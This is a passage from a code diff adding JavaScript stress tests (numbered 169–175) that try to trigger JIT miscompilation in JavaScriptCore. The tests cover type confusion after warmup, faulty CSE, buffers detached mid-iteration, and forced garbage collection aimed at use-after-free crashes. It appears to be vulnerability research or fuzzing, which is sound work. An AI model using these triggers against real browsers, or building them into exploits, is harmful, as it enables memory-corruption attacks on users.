+      [Symbol.iterator]: function(){
+        return {
+          next: function(){
+            iterN++;
+            if(iterN === 6) throw new Error('iterator_mid_groupBy');
+            if(iterN > 10) return { value: undefined, done: true };
+            return { value: iterN * 10, done: false };
+          }
+        };
+      }
+    };
+    try { Object.groupBy(customIter, function(v){ return v > 50 ? 'H' : 'L'; }); } catch(e){}
+  } catch(e){}
+  log('Teste 169: fim');
+}
+
+// T170 — DFG: TailCall e TailCallVarargs com tipos mudados pos-JIT
+// Tail calls permitem reutilizar o frame; se o tipo de retorno muda,
+// o frame reutilizado pode ter tipo errado para o caller
+function t170(){
+  log('Teste 170: inicio');
+  try {
+    // Funcao que faz tail call
+    function tail(n){ return inner(n); } // tail call de inner
+    function inner(n){
+      if(n <= 0) return 1.5;        // Double no caso base
+      return n * 2.0;
+    }
+    // Warmup: tail retorna sempre Double
+    for(let i = 0; i < 0x30000; i++) tail(i % 100);
+
+    // Mudar inner para retornar tipos diferentes
+    let innerCallN = 0;
+    function newInner(n){
+      innerCallN++;
+      if(innerCallN % 3 === 0) return { v: n }; // Object — tipo diferente
+      if(innerCallN % 5 === 0) return null;
+      return n * 2.0;
+    }
+    // Substituir inner no closure nao e possivel diretamente, mas podemos
+    // passar funcao como argumento para simular o mesmo efeito
+    function tailGeneric(fn, n){ return fn(n); }
+    for(let i = 0; i < 0x30000; i++) tailGeneric(inner, i % 100);
+    for(let i = 0; i < 1000; i++){
+      try { tailGeneric(newInner, i % 100); } catch(e){}
+    }
+
+    // TailCallVarargs via apply
+    function tailApply(fn, args){ return fn.apply(null, args); }
+    for(let i = 0; i < 0x20000; i++) tailApply(inner, [i % 100]);
+    // Varargs com numero diferente de argumentos
+    for(let i = 0; i < 500; i++){
+      try { tailApply(newInner, [i, i+1, i+2]); } catch(e){}
+      try { tailApply(newInner, []); }             catch(e){}
+    }
+  } catch(e){}
+  log('Teste 170: fim');
+}
+
+// T171 — DFG: GetByVal em String com indice calculado por CSE errado
+// JIT pode usar CSE para reusar resultado de str[i] anterior;
+// se str e substituida entre os dois acessos, o CSE retorna valor da string antiga
+function t171(){
+  log('Teste 171: inicio');
+  try {
+    let strRef = 'hello world abcde fghij';
+
+    function getChar(i){
+      let c1 = strRef[i];    // primeiro acesso
+      strRef = strRef;        // re-atribuicao aparentemente no-op — mas CSE pode ver diferente
+      let c2 = strRef[i];    // segundo acesso — CSE pode reusar c1
+      return c1 === c2;
+    }
+    // Warmup
+    for(let i = 0; i < 0x30000; i++) getChar(i % 20);
+
+    // Mudar strRef entre os dois acessos via getter global
+    let getCount = 0;
+    function getCharWithChange(i){
+      let c1 = strRef[i];
+      // mudar strRef aqui
+      strRef = 'XXXXXXXXXXXXXXXXXXXXXXXXX';
+      let c2 = strRef[i]; // c1 != c2 esperado; CSE erroneamente retorna c1
+      strRef = 'hello world abcde fghij'; // restaurar
+      return [c1, c2];
+    }
+    for(let i = 0; i < 1000; i++){
+      try { getCharWithChange(i % 20); } catch(e){}
+    }
+
+    // StringObject vs String primitiva — JIT pode tratar de forma diferente
+    const strObj = Object('hello world');
+    function getFromBoth(s, so, i){
+      let a = s[i];
+      let b = so[i];
+      return [a, b];
+    }
+    for(let i = 0; i < 0x20000; i++) getFromBoth('hello world', strObj, i % 11);
+    // Agora indices fora do range
+    for(let idx of [-1, 11, 100, NaN, Infinity]){
+      try { getFromBoth('hello world', strObj, idx); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 171: fim');
+}
+
+// T172 — JSC: Promise.any com array de thenables que lancam todos — AggregateError
+// AggregateError e relativamente novo; JSC pode ter bugs na sua construcao
+function t172(){
+  log('Teste 172: inicio');
+  try {
+    // Todos os thenables lancam — deve criar AggregateError
+    const allReject = [
+      Promise.reject(new Error('e1')),
+      Promise.reject(new TypeError('e2')),
+      Promise.reject(new RangeError('e3')),
+      Promise.reject(42),
+      Promise.reject(null),
+      Promise.reject(undefined),
+      Promise.reject(Symbol('s')),
+    ];
+    Promise.any(allReject).catch(function(err){
+      // AggregateError deve ter .errors array
+      if(err instanceof AggregateError){
+        try { let len = err.errors.length; }   catch(e){}
+        try { err.errors.forEach(function(){}); } catch(e){}
+      }
+    });
+
+    // Promise.any com array gigante de rejeitados
+    const manyReject = new Array(10000).fill(null).map(function(_, i){
+      return Promise.reject(i);
+    });
+    Promise.any(manyReject).catch(function(err){
+      try { err.errors[0]; }                     catch(e){}
+      try { err.errors[9999]; }                  catch(e){}
+      try { structuredClone(err); }              catch(e){}
+    });
+
+    // Promise.any com thenable ciclico
+    let cycleCount = 0;
+    const cycleThenable = {
+      then: function(res, rej){
+        cycleCount++;
+        if(cycleCount > 20) return rej(new Error('stop'));
+        rej(cycleThenable); // rejeitar com outro thenable
+      }
+    };
+    Promise.any([cycleThenable, Promise.reject(1)]).catch(function(){});
+
+    // AggregateError construido manualmente
+    try {
+      const ae = new AggregateError([1, 'two', null, undefined, {x:1}], 'test message');
+      let errs = ae.errors;
+      structuredClone(ae);
+    } catch(e){}
+  } catch(e){}
+  log('Teste 172: fim');
+}
+
+// T173 — DFG: ArrayPush / ArrayPop com array que tem Symbol.species e muda ArrayMode
+// Array.from usa Symbol.species; se species retorna subclasse, pode ter ArrayMode errado
+function t173(){
+  log('Teste 173: inicio');
+  try {
+    class SpecArr extends Array {
+      static get [Symbol.species](){ return Array; } // species e Array normal
+      push(...args){
+        super.push(...args);
+        return this.length;
+      }
+    }
+    const sa = new SpecArr(1.1, 2.2, 3.3);
+
+    function doPush(arr, val){ arr.push(val); return arr.length; }
+    function doPop(arr){ return arr.pop(); }
+
+    // Warmup com SpecArr
+    for(let i = 0; i < 0x20000; i++){
+      if(sa.length < 2) sa.push(i * 0.1);
+      doPop(sa);
+      doPush(sa, i * 0.1);
+    }
+
+    // Mudar o tipo dos elementos: de Double para Object
+    for(let i = 0; i < 500; i++){
+      try { doPush(sa, { val: i }); } catch(e){} // ArrayMode muda para ArrayWithContiguous
+    }
+    // Pop dos objetos
+    for(let i = 0; i < 500; i++){
+      try { doPop(sa); } catch(e){}
+    }
+    // Push de tipos misturados
+    for(let v of [null, undefined, Symbol('x'), 'string', true, NaN]){
+      try { doPush(sa, v); } catch(e){}
+    }
+
+    // Mudar Symbol.species durante operacoes
+    SpecArr[Symbol.species] = class SubSub extends Array {
+      constructor(...args){ super(...args); this.special = true; }
+    };
+    try { sa.map(function(v){ return v; }); }    catch(e){}
+    try { sa.filter(function(v){ return v; }); } catch(e){}
+    try { sa.slice(0, 2); }                      catch(e){}
+  } catch(e){}
+  log('Teste 173: fim');
+}
+
+// T174 — JSC: for-of com TypedArray que tem seu buffer detachado durante iteracao
+// TypedArray iterator usa o buffer internamente; se buffer e detachado via postMessage
+// durante a iteracao, o iterator acessa ponteiro invalido
+function t174(){
+  log('Teste 174: inicio');
+  try {
+    function makeAndIterate(doDetach){
+      const buf = new ArrayBuffer(64);
+      const f64 = new Float64Array(buf);
+      for(let i = 0; i < 8; i++) f64[i] = i * 1.1;
+
+      let sum = 0;
+      let idx = 0;
+      for(let v of f64){
+        sum += v;
+        idx++;
+        if(doDetach && idx === 4){
+          // Detach o buffer durante a iteracao!
+          const cyclic = { buf: buf, self: null };
+          cyclic.self = cyclic;
+          try { postMessage(cyclic, '*', [buf]); } catch(e){}
+        }
+      }
+      return sum;
+    }
+
+    // Warmup sem detach
+    for(let i = 0; i < 0x20000; i++) makeAndIterate(false);
+
+    // Pos-JIT: detach no meio da iteracao
+    for(let i = 0; i < 100; i++){
+      try { makeAndIterate(true); } catch(e){}
+    }
+
+    // Versao com Array.from de TypedArray que e detachado
+    function fromDetached(doDetach){
+      const buf2 = new ArrayBuffer(64);
+      const u32 = new Uint32Array(buf2);
+      for(let i = 0; i < 16; i++) u32[i] = i;
+
+      let mid = false;
+      const iter = {
+        [Symbol.iterator]: function(){
+          let i = 0;
+          return {
+            next: function(){
+              if(!mid && i === 8 && doDetach){
+                mid = true;
+                const cyclic = { b: buf2, s: null };
+                cyclic.s = cyclic;
+                try { postMessage(cyclic, '*', [buf2]); } catch(e){}
+              }
+              if(i >= 16) return { done: true };
+              return { value: u32[i++], done: false };
+            }
+          };
+        }
+      };
+      return Array.from(iter);
+    }
+    for(let i = 0; i < 0x10000; i++) fromDetached(false);
+    for(let i = 0; i < 100; i++){
+      try { fromDetached(true); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 174: fim');
+}
+
+// T175 — Combinacao final: CSE incorreto + inferred type widening + store barrier
+// Stress combinado dos tres vetores mais promissores desta rodada,
+// com GC forcado entre cada fase para maximizar chance de UAF/crash
+function t175(){
+  log('Teste 175: inicio');
+  try {
+    'use strict';
+    let escapeSlot = null;
+
+    // Fase 1: inferred type widening via atribuicao pos-JIT
+    function inferTest(objs, val, phase){
+      let sum = 0;
+      for(let o of objs){
+        sum += o.x; // JIT inere o.x como Int32 na fase de warmup
+      }
+      if(phase === 'widen'){ objs[0].x = val; } // widening
+      return sum;
+    }
+    const inferObjs = new Array(50).fill(null).map(function(_, i){ return { x: i }; });
+    for(let i = 0; i < 0x30000; i++) inferTest(inferObjs, 0, 'normal');
+
+    // Fase 2: CSE incorreto via side effect entre dois acessos
+    let cseCounter = 0;
+    function cseTest(obj, fn){
+      let a = obj.v;  // GetByVal — CSE cacheia
+      fn();           // pode modificar obj.v
+      let b = obj.v;  // CSE pode reusar 'a'
+      escapeSlot = obj;
+      return a + b;
+    }
+    const cseObj = { v: 1.1 };
+    const noSE   = function(){};
+    const withSE = function(){ cseObj.v = ++cseCounter * 2.2; };
+    for(let i = 0; i < 0x30000; i++) cseTest(cseObj, noSE);
+
+    // Fase 3: store barrier ausente
+    function barrierStress(flip){
+      const X = { tag: 'X', data: new Float64Array(4) };
+      const Y = { tag: 'Y', data: new Uint32Array(4) };
+      let obj = flip ? X : Y;
+      obj.data[0] = flip ? 1.5 : 2;
+      escapeSlot = obj;
+      return obj.data[0];
+    }
+    for(let i = 0; i < 0x30000; i++) barrierStress(i % 2 === 0);
+
+    // GC agressivo
+    let trash = new Array(200000).fill(null).map(function(){ return { x: new Uint8Array(8) }; });
+    trash = null;
+
+    // Pos-FTL: ativar todos os vetores com GC entre cada um
+    for(let i = 0; i < 200; i++){
+      try { inferTest(inferObjs, 1.5, 'widen'); } catch(e){} // widening
+      try { cseTest(cseObj, withSE); }            catch(e){} // CSE com SE
+      try { barrierStress(i % 2 === 0); }         catch(e){} // barrier
+
+      // GC apos cada combinacao
+      if(i % 20 === 0){
+        trash = new Array(50000).fill(null).map(function(){ return {}; });
+        trash = null;
+      }
+
+      // Usar escapeSlot que pode ter sido coletado
+      try {
+        if(escapeSlot && typeof escapeSlot === 'object'){
+          let v = escapeSlot.data;
+          if(v) v[0] = 0xDEAD;
+        }
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 175: fim');
+}
+</script>
+</body>
+</html>
